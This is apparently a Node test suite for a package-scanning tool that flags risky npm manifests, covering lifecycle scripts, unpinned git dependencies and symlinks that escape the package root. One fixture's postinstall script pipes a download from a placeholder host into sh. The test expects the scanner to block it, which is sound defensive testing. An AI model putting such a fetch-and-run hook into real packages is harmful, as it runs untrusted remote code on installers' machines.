import assert from 'node:assert/strict'
import { mkdtemp, mkdir, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, it } from 'node:test'
import { scanDirectory } from '../src/scan.js'

async function fixture(manifest: Record<string, unknown>, files: Record<string, string> = {}): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'plugin-notary-'))
  await writeFile(join(root, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`)
  for (const [path, contents] of Object.entries(files)) {
    const fullPath = join(root, path)
    const parent = fullPath.slice(0, fullPath.lastIndexOf('/'))
    await mkdir(parent, { recursive: true })
    await writeFile(fullPath, contents)
  }
  return root
}

describe('directory scanner', () => {
  it('recognizes a minimal DSH bundle', async () => {
    const root = await fixture(
      {
        name: 'safe-example',
        version: '1.0.0',
        dsh: { bundle: { patch: 'cordis.patch.yml' } },
      },
      { 'cordis.patch.yml': 'name: safe-example\n' },
    )

    const report = await scanDirectory(root)
    assert.equal(report.dsh.isBundle, true)
    assert.equal(report.dsh.patch, 'cordis.patch.yml')
    assert.equal(report.riskVerdict, 'allow')
    assert.equal(report.coverageVerdict, 'incomplete')
    assert.equal(report.verdict, 'review')
    assert.match(report.target.artifactDigest, /^sha256:[0-9a-f]{64}$/)
  })

  it('requires review when a declared DSH patch is not a regular file', async () => {
    const root = await fixture({
      name: 'missing-patch',
      version: '1.0.0',
      dsh: { bundle: { patch: 'missing.patch.yml' } },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'dsh-patch-not-regular-file'))
  })

  it('requires review for lifecycle scripts', async () => {
    const root = await fixture({
      name: 'builds-on-install',
      version: '1.0.0',
      scripts: { prepare: 'node scripts/build.js' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'review')
    assert.equal(report.verdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'lifecycle-script-present'))
  })

  it('blocks a remote shell installation pipeline', async () => {
    const root = await fixture({
      name: 'remote-shell',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://example.invalid/install.sh | sh' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.riskVerdict, 'block')
    assert.equal(report.verdict, 'block')
    assert.ok(report.findings.some(item => item.code === 'install-script-remote-shell'))
  })

  it('requires review for an unpinned git dependency', async () => {
    const root = await fixture({
      name: 'mutable-dependency',
      version: '1.0.0',
      dependencies: { example: 'git+https://github.com/example/project.git#main' },
    })

    const report = await scanDirectory(root)
    assert.equal(report.verdict, 'review')
    assert.ok(report.findings.some(item => item.code === 'mutable-git-dependency'))
  })

  it('blocks a symlink that escapes the reviewed root', async () => {
    const root = await fixture({ name: 'escaping-link', version: '1.0.0' })
    await symlink('../outside', join(root, 'outside-link'))

    const report = await scanDirectory(root)
    assert.equal(report.verdict, 'block')
    assert.ok(report.findings.some(item => item.code === 'symlink-escapes-package'))
  })

  it('counts symlinks and directories against the scan entry budget', async () => {
    const root = await fixture({ name: 'entry-budget', version: '1.0.0' })
    await symlink('package.json', join(root, 'one-link'))

    const report = await scanDirectory(root, { maxFiles: 1 })
    assert.equal(report.coverage.staticSource, 'incomplete')
    assert.ok(report.findings.some(item => item.code === 'scan-budget-exceeded'))
  })
})
